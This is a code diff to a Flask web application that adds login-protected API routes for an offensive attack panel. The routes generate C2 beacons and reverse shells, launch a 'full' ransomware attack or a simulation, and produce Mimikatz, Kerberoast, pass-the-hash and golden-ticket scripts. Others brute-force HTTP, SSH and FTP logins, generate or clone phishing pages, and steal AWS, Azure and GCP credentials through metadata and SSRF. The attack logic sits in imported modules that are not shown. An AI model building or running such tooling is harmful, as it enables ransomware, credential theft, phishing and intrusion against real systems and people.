@@ -1,12 +1,20 @@
 import os, sys, json, time, threading, re, socket, base64, sqlite3, random, string
 from datetime import datetime
 from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
-from flask import Flask, render_template, request, jsonify, redirect, url_for, session, flash
+from flask import Flask, render_template, request, jsonify, redirect, url_for, session, flash, send_file
 from flask_socketio import SocketIO, emit
 from flask_login import LoginManager, UserMixin, login_user, logout_user, login_required
 from config import Config
 import requests
 from bs4 import BeautifulSoup
+
+# Module imports
+from modules.c2.beacon import C2Beacon, generate_reverse_shell
+from modules.post_exploit.ransomware import RansomwareSimulator, run_ransomware_attack, run_ransomware_simulation, decrypt_ransomware
+from modules.windows_ad.credential_dump import generate_mimikatz_script, generate_powershell_cred_dump, generate_kerberoast_script, generate_pass_the_hash_script, generate_golden_ticket_script
+from modules.bruteforce.login_bruteforce import run_bruteforce, bruteforce_http_form, bruteforce_ssh, bruteforce_ftp
+from modules.social.phishing_gen import generate_phishing_page, clone_custom_page, save_phishing_page, list_templates
+from modules.cloud.aws_azure_gcp import steal_aws_credentials, steal_azure_credentials, steal_gcp_credentials, scan_cloud_metadata, exploit_ssrf_to_cloud
 
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -829,6 +837,254 @@ def update_progress(scan_id, progress):
     if scan_id in scan_results:
         scan_results[scan_id]['progress'] = progress
         socketio.emit('progress_update', {'scan_id': scan_id, 'progress': progress})
+
+# ============================================================
+# C2 BEACON ROUTES
+# ============================================================
+@app.route('/api/c2/generate_payload', methods=['POST'])
+@login_required
+def api_c2_generate_payload():
+    data = request.get_json()
+    c2_server = data.get('c2_server', '')
+    payload_type = data.get('payload_type', 'python')
+    sleep_time = data.get('sleep_time', 5)
+    if not c2_server: return jsonify({'error': 'C2 server URL required'}), 400
+    beacon = C2Beacon(c2_server, sleep_time=sleep_time)
+    payload = beacon.generate_payload(payload_type)
+    return jsonify({'payload': payload, 'type': payload_type, 'c2_server': c2_server})
+
+@app.route('/api/c2/reverse_shell', methods=['POST'])
+@login_required
+def api_c2_reverse_shell():
+    data = request.get_json()
+    host = data.get('host', '')
+    port = data.get('port', 4444)
+    shell_type = data.get('shell_type', 'bash')
+    if not host: return jsonify({'error': 'Host required'}), 400
+    shell = generate_reverse_shell(host, port, shell_type)
+    return jsonify({'shell': shell, 'type': shell_type, 'host': host, 'port': port})
+
+# ============================================================
+# RANSOMWARE ROUTES
+# ============================================================
+@app.route('/api/ransomware/execute', methods=['POST'])
+@login_required
+def api_ransomware_execute():
+    data = request.get_json()
+    target_dir = data.get('target_directory', '/var/www/html')
+    max_files = data.get('max_files', 50)
+    full_attack = data.get('full_attack', False)
+    if full_attack:
+        result = run_ransomware_attack(max_files_per_dir=max_files)
+    else:
+        result = run_ransomware_simulation(target_dir, max_files)
+    emit_feed('ransomware', f'Ransomware {"full attack" if full_attack else "simulation"} completed: {result.get("files_encrypted", 0)} files encrypted', 'warning' if result.get('success') else 'error')
+    return jsonify(result)
+
+@app.route('/api/ransomware/decrypt', methods=['POST'])
+@login_required
+def api_ransomware_decrypt():
+    data = request.get_json()
+    target_dir = data.get('target_directory', '')
+    encryption_key = data.get('encryption_key', '')
+    if not target_dir or not encryption_key: return jsonify({'error': 'Target directory and encryption key required'}), 400
+    result = decrypt_ransomware(target_dir, encryption_key)
+    emit_feed('ransomware', f'Decryption completed: {result.get("restored", 0)} restored, {result.get("failed", 0)} failed', 'success' if result.get('success') else 'error')
+    return jsonify(result)
+
+# ============================================================
+# CREDENTIAL DUMP ROUTES
+# ============================================================
+@app.route('/api/creds/mimikatz', methods=['POST'])
+@login_required
+def api_creds_mimikatz():
+    data = request.get_json()
+    technique = data.get('technique', 'sekurlsa')
+    commands = generate_mimikatz_script(technique)
+    return jsonify({'technique': technique, 'commands': commands})
+
+@app.route('/api/creds/powershell', methods=['POST'])
+@login_required
+def api_creds_powershell():
+    script = generate_powershell_cred_dump()
+    return jsonify({'script': script, 'type': 'powershell_cred_dump'})
+
+@app.route('/api/creds/kerberoast', methods=['POST'])
+@login_required
+def api_creds_kerberoast():
+    data = request.get_json()
+    domain = data.get('domain', '')
+    if not domain: return jsonify({'error': 'Domain required'}), 400
+    script = generate_kerberoast_script(domain)
+    return jsonify({'script': script, 'domain': domain, 'type': 'kerberoast'})
+
+@app.route('/api/creds/pass_the_hash', methods=['POST'])
+@login_required
+def api_creds_pass_the_hash():
+    data = request.get_json()
+    target_host = data.get('target_host', '')
+    ntlm_hash = data.get('ntlm_hash', '')
+    username = data.get('username', 'Administrator')
+    if not target_host or not ntlm_hash: return jsonify({'error': 'Target host and NTLM hash required'}), 400
+    script = generate_pass_the_hash_script(target_host, ntlm_hash, username)
+    return jsonify({'script': script, 'type': 'pass_the_hash'})
+
+@app.route('/api/creds/golden_ticket', methods=['POST'])
+@login_required
+def api_creds_golden_ticket():
+    data = request.get_json()
+    domain = data.get('domain', '')
+    domain_sid = data.get('domain_sid', '')
+    krbtgt_hash = data.get('krbtgt_hash', '')
+    username = data.get('username', 'Administrator')
+    if not domain or not domain_sid or not krbtgt_hash: return jsonify({'error': 'Domain, SID, and krbtgt hash required'}), 400
+    script = generate_golden_ticket_script(domain, domain_sid, krbtgt_hash, username)
+    return jsonify({'script': script, 'type': 'golden_ticket'})
+
+# ============================================================
+# BRUTEFORCE ROUTES
+# ============================================================
+@app.route('/api/bruteforce/http', methods=['POST'])
+@login_required
+def api_bruteforce_http():
+    data = request.get_json()
+    target_url = data.get('target_url', '')
+    username_field = data.get('username_field', 'username')
+    password_field = data.get('password_field', 'password')
+    usernames = data.get('usernames', None)
+    passwords = data.get('passwords', None)
+    if not target_url: return jsonify({'error': 'Target URL required'}), 400
+    result = bruteforce_http_form(target_url, username_field, password_field, usernames, passwords)
+    if result.get('success'):
+        emit_feed('bruteforce', f'HTTP bruteforce SUCCESS: {result["credentials"]}', 'success')
+    else:
+        emit_feed('bruteforce', f'HTTP bruteforce failed after {result.get("attempts", 0)} attempts', 'warning')
+    return jsonify(result)
+
+@app.route('/api/bruteforce/ssh', methods=['POST'])
+@login_required
+def api_bruteforce_ssh():
+    data = request.get_json()
+    host = data.get('host', '')
+    port = data.get('port', 22)
+    usernames = data.get('usernames', None)
+    passwords = data.get('passwords', None)
+    if not host: return jsonify({'error': 'Host required'}), 400
+    result = bruteforce_ssh(host, port, usernames, passwords)
+    if result.get('success'):
+        emit_feed('bruteforce', f'SSH bruteforce SUCCESS: {result["credentials"]}', 'success')
+    else:
+        emit_feed('bruteforce', f'SSH bruteforce failed after {result.get("attempts", 0)} attempts', 'warning')
+    return jsonify(result)
+
+@app.route('/api/bruteforce/ftp', methods=['POST'])
+@login_required
+def api_bruteforce_ftp():
+    data = request.get_json()
+    host = data.get('host', '')
+    port = data.get('port', 21)
+    usernames = data.get('usernames', None)
+    passwords = data.get('passwords', None)
+    if not host: return jsonify({'error': 'Host required'}), 400
+    result = bruteforce_ftp(host, port, usernames, passwords)
+    if result.get('success'):
+        emit_feed('bruteforce', f'FTP bruteforce SUCCESS: {result["credentials"]}', 'success')
+    else:
+        emit_feed('bruteforce', f'FTP bruteforce failed after {result.get("attempts", 0)} attempts', 'warning')
+    return jsonify(result)
+
+# ============================================================
+# PHISHING ROUTES
+# ============================================================
+@app.route('/api/phishing/templates', methods=['GET'])
+@login_required
+def api_phishing_templates():
+    templates = list_templates()
+    return jsonify({'templates': templates})
+
+@app.route('/api/phishing/generate', methods=['POST'])
+@login_required
+def api_phishing_generate():
+    data = request.get_json()
+    template_name = data.get('template', 'google')
+    custom_url = data.get('custom_url', None)
+    capture_endpoint = data.get('capture_endpoint', '/capture')
+    html = generate_phishing_page(template_name, custom_url, capture_endpoint)
+    if not html: return jsonify({'error': 'Invalid template'}), 400
+    filename = f'phishing_{template_name}_{int(time.time())}.html'
+    filepath = save_phishing_page(html, filename)
+    emit_feed('phishing', f'Phishing page generated: {template_name}', 'info')
+    return jsonify({'html': html, 'filepath': filepath, 'template': template_name})
+
+@app.route('/api/phishing/clone', methods=['POST'])
+@login_required
+def api_phishing_clone():
+    data = request.get_json()
+    target_url = data.get('target_url', '')
+    capture_endpoint = data.get('capture_endpoint', '/capture')
+    if not target_url: return jsonify({'error': 'Target URL required'}), 400
+    html = clone_custom_page(target_url, capture_endpoint)
+    filename = f'phishing_clone_{int(time.time())}.html'
+    filepath = save_phishing_page(html, filename)
+    emit_feed('phishing', f'Phishing page cloned from {target_url}', 'info')
+    return jsonify({'html': html, 'filepath': filepath, 'source': target_url})
+
+# ============================================================
+# CLOUD ATTACK ROUTES
+# ============================================================
+@app.route('/api/cloud/steal_aws', methods=['POST'])
+@login_required
+def api_cloud_steal_aws():
+    result = steal_aws_credentials()
+    if result.get('success'):
+        emit_feed('cloud', 'AWS credentials stolen!', 'success')
+    else:
+        emit_feed('cloud', 'Failed to steal AWS credentials', 'warning')
+    return jsonify(result)
+
+@app.route('/api/cloud/steal_azure', methods=['POST'])
+@login_required
+def api_cloud_steal_azure():
+    result = steal_azure_credentials()
+    if result.get('success'):
+        emit_feed('cloud', 'Azure credentials stolen!', 'success')
+    else:
+        emit_feed('cloud', 'Failed to steal Azure credentials', 'warning')
+    return jsonify(result)
+
+@app.route('/api/cloud/steal_gcp', methods=['POST'])
+@login_required
+def api_cloud_steal_gcp():
+    result = steal_gcp_credentials()
+    if result.get('success'):
+        emit_feed('cloud', 'GCP credentials stolen!', 'success')
+    else:
+        emit_feed('cloud', 'Failed to steal GCP credentials', 'warning')
+    return jsonify(result)
+
+@app.route('/api/cloud/scan_all', methods=['POST'])
+@login_required
+def api_cloud_scan_all():
+    results = scan_cloud_metadata()
+    if results:
+        emit_feed('cloud', f'Cloud metadata found on {len(results)} providers', 'success')
+    else:
+        emit_feed('cloud', 'No cloud metadata accessible', 'info')
+    return jsonify({'providers': results})
+
+@app.route('/api/cloud/ssrf_exploit', methods=['POST'])
+@login_required
+def api_cloud_ssrf_exploit():
+    data = request.get_json()
+    target_url = data.get('target_url', '')
+    parameter = data.get('parameter', '')
+    if not target_url or not parameter: return jsonify({'error': 'Target URL and parameter required'}), 400
+    results = exploit_ssrf_to_cloud(target_url, parameter)
+    if results:
+        emit_feed('cloud', f'SSRF cloud exploit found {len(results)} accessible endpoints', 'success')
+    else:
+        emit_feed('cloud', 'SSRF cloud exploit returned no results', 'warning')
+    return jsonify({'results': results})
 
 @socketio.on('connect')
 def handle_connect():
